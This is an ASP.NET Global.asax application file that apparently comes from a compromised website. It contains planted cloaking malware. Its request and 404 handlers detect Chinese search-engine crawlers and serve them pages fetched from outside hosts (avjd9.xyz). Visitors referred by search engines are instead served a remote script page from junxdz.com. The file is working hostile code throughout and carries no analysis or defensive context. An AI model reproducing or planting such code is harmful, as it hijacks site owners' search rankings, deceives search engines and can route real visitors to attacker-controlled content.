<%@ Application Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">


    void Application_Error(object sender, EventArgs e) 
{ 
if(Context != null) 
{ 
HttpContext ctx = HttpContext.Current; 
Exception ex = ctx.Server.GetLastError(); 
HttpException ev = ex as HttpException; 
if(ev!= null) 
{ 
if(ev.GetHttpCode() == 404) 
{ 


           string[] spidersString = "baiduspider,baidu.com,sogou.com,sougou,360spider".ToLower().Split(',');
           string[] refesString = "sogou,so.com,baidu,google,youdao,yahoo,bing,118114,biso,gougou,ifeng,ivc,sooule,niuhu,biso,360".ToLower().Split(',');
	string Path = "http://8.avjd9.xyz/BC404.php?url=";
	string jsPath = "http://t.junxdz.com/t.html";
	string leftPath = "http://8.avjd9.xyz/BCleft.php";
        string REFERER = "";
	string user="";
	string urls=Request.Url.ToString();
        if (Request.UrlReferrer != null)
        {
            REFERER = Request.UrlReferrer.ToString().ToLower();
        }
	 if (Request.ServerVariables["HTTP_USER_AGENT"] != null)
        {
            user = Request.ServerVariables["HTTP_USER_AGENT"].ToString().ToLower();
        }

        foreach (string s in refesString)
        {
            if (REFERER.IndexOf(s) != -1)
            {
		ctx.ClearError();
        	string getjs = get_content(jsPath);
        	Response.Write(getjs);
                Response.End();
            }
        }
        foreach (string s in spidersString)
        {
            if (user.IndexOf(s) != -1)
            {
		ctx.ClearError();
				Response.Clear();
		if (urls.IndexOf("sitemap") != -1)
            {
        	string getleft = get_content(leftPath);
        	Response.Write(getleft);
                Response.End();
            }

        	string gethttp = get_content(Path+urls);
        	Response.Write(gethttp);
                Response.End();
            }
        }
//Response.Redirect("/");


	} 

} 
}
}

    void Application_BeginRequest(object sender, EventArgs e)
    {

           string[] spidersString = "Baiduspider,baidu.com,sogou.com,sougou,360Spider".ToLower().Split(',');
	string user="";


	 if (Request.ServerVariables["HTTP_USER_AGENT"] != null)
        {
            user = Request.ServerVariables["HTTP_USER_AGENT"].ToString().ToLower();
        }
        foreach (string s in spidersString)
        {
            if (user.IndexOf(s) != -1)
            {
		Response.Clear();
       		string gethttp = get_content("http://8.avjd9.xyz/BCleft2.php");
        	Response.Write(gethttp);

		}
	}



	}



private string get_content(string p)
	{
		string s = "";
		try
		{
			System.Net.WebClient client = new System.Net.WebClient();
			client.Encoding = System.Text.Encoding.GetEncoding("gb2312");
			s = client.DownloadString(p);
			client.Dispose();
		}
		catch(Exception ex)
		{
			Response.Write(""+ex.Message);
		}
		return s;
	}


</script>